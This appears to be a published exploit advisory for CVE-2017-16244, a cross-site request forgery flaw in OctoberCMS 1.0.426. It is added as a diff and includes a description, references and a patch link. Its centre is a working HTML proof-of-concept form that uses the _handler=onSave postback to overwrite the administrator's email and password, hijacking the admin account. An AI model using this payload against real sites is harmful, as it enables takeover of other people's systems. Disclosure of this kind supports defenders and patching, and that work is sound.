@@ -1,0 +1,49 @@
+# Exploit Title: OctoberCMS 1.0.426 - CSRF to Admin Account Takover
+# Vendor Homepage: https://octobercms.com
+# Software Link: https://octobercms.com/download
+# Exploit Author: Zain Sabahat
+# Website: https://about.me/ZainSabahat
+# Category: webapps
+# CVE: CVE-2017-16244
+ 
+1. Description
+
+Cross-Site Request Forgery exists in OctoberCMS 1.0.426 (aka Build 426) due to improper validation of CSRF Tokens for postback handling, allowing an attacker to successfully take over the victim's account.
+The vendor was using additional X-CSRF Headers and CSRF Token to prevent the CSRF from occurring.The researcher found a way to bypass this protection.After digging more in the Application he found a postback variable "_handler=" which could be used to perform CSRF without X-Headers.The CSRF Tokens were also not being validated when _handler parameter was used to make the request.
+In short, this attack bypasses a protection mechanism involving X-CSRF headers and CSRF tokens via a certain _handler postback variable.
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16244
+https://vuldb.com/?id.108857 
+
+2. Proof of Concept
+ Below is the CSRF Exploit (.html) which can lead to the takeover of the Admin's Account upon successful execution.
+
+<html>
+  <body>
+    <form action="http://host/backend/users/myaccount" method="POST">
+      <input type="hidden" name="&#95;handler" value="onSave" />
+      <input type="hidden" name="User&#91;login&#93;" value="Admin" />
+      <input type="hidden" name="User&#91;email&#93;" value="Hacked&#64;hacked&#46;com" />
+      <input type="hidden" name="User&#91;first&#95;name&#93;" value="Admin" />
+      <input type="hidden" name="User&#91;last&#95;name&#93;" value="1337" />
+      <input type="hidden" name="User&#91;password&#93;" value="YourNewPassword" />
+      <input type="hidden" name="User&#91;password&#95;confirmation&#93;" value="YourNewPassword" />
+      <input type="hidden" name="redirect" value="0" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Upon execution of this CSRF, the Admin Account details will be replaced by ours leading to complete hijacking of Admin Account.
+ 
+3. Reference
+ 
+   https://github.com/octobercms/october/commit/4a6e0e1e0e2c3facebc17e0db38c5b4d4cb05bd0
+   https://vuldb.com/?id.108857
+
+4. Solution
+ 
+The vulnerability will be patched by the vendor in the next release of OctoberCMS.Following changes should be made for a temporary fix (https://github.com/octobercms/october/commit/4a6e0e1e0e2c3facebc17e0db38c5b4d4cb05bd0).
+
+
+
